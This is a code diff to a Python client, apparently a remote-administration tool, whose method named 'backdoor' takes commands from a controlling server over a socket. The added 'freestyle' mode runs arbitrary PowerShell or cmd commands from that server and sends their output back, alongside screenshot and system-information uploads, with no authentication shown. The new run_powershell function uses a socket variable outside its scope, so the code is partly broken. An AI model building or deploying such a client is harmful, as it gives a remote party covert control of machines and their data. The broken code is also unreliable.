@@ -64,20 +64,6 @@ class Client:
             print("Anydesk.exe was not found.")
             return
 
-    def convert_to_bytes(self, no):
-        result = bytearray()
-        result.append(no & 255)
-        for i in range(3):
-            no = no >> 8
-            result.append(no & 255)
-        return result
-
-    def bytes_to_number(self, b):
-        res = 0
-        for i in range(4):
-            res += b[i] << (i * 8)
-        return res
-
     def backdoor(self, soc):
         # Send Computer Name to Server
         ident = self.hostname
@@ -101,6 +87,28 @@ class Client:
                 if len(str(command)) == 0:
                     print(colored("[!]Disconnected!", 'red'))
                     break
+
+                # Freestyle
+                if str(command).lower() == "freestyle":
+                    print(command)
+                    try:
+                        command = soc.recv(1024).decode()
+                        if str(command) == "ps":
+                            cmd = soc.recv(1024).decode()
+                            run_powershell(cmd, self.hostname, self.localIP, self.dt)
+
+                        elif str(command) == "cmd":
+                            cmd = soc.recv(1024).decode()
+                            run_cmd(cmd)
+
+                        elif str(command) == "back":
+                            msg = "back".encode()
+                            soc.send(msg)
+                            continue
+
+                    except socket.error as e:
+                        print(e)
+                        break
 
                 # Vital Signs
                 if str(command).lower() == "alive":
@@ -145,7 +153,7 @@ class Client:
                         print(f"@Server: {msg}")
                         length = os.path.getsize(self.filename)
                         print(f"SC Size: {length}")
-                        soc.send(self.convert_to_bytes(length))
+                        soc.send(convert_to_bytes(length))
 
                         # Send file content
                         with open(self.filename, 'rb') as img_file:
@@ -188,7 +196,7 @@ class Client:
                     time.sleep(2)
                     length = os.path.getsize(self.sifile)
                     print(f"SysInfoFile Size: {length}")
-                    soc.send(self.convert_to_bytes(length))
+                    soc.send(convert_to_bytes(length))
 
                     try:
                         with open(self.sifile, 'rb') as sy_file:
@@ -313,13 +321,54 @@ class Client:
                 continue
 
             except (Exception, socket.error) as err:
-                self.connection()
-
-        # self.connection()
+                break
 
 
-def run_powershell(cmd):
-    return subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+def run_powershell(cmd, hostname, localip, fulldt):
+    filename = rf"c:\MekifRemoteAdmin\powershell {hostname} {str(localip)} {fulldt}.txt"
+    with open(filename, 'w') as file:
+        p = subprocess.run(["powershell", "-Command", cmd], stdout=file)
+
+    soc.send(filename.encode())
+    msg = soc.recv(1024).decode()
+    print(msg)
+
+    length = os.path.getsize(filename)
+    print(f"PSFile Size: {length}")
+    soc.send(convert_to_bytes(length))
+
+    try:
+        with open(filename, 'rb') as ps_file:
+            ps_data = ps_file.read(1024)
+            while ps_data:
+                soc.send(ps_data)
+                if not ps_data:
+                    break
+
+                ps_data = ps_file.read(1024)
+
+        msg = soc.recv(1024).decode()
+        print(f"@Server: {msg}")
+        soc.send(f"{hostname} | {localip}: Powershell Command Completed.\n".encode())
+
+    except socket.error:
+        return False
+
+
+def convert_to_bytes(no):
+    result = bytearray()
+    result.append(no & 255)
+    for i in range(3):
+        no = no >> 8
+        result.append(no & 255)
+    return result
+
+
+def bytes_to_number(b):
+    res = 0
+    for i in range(4):
+        res += b[i] << (i * 8)
+    return res
 
 
 def run_cmd(cmd):
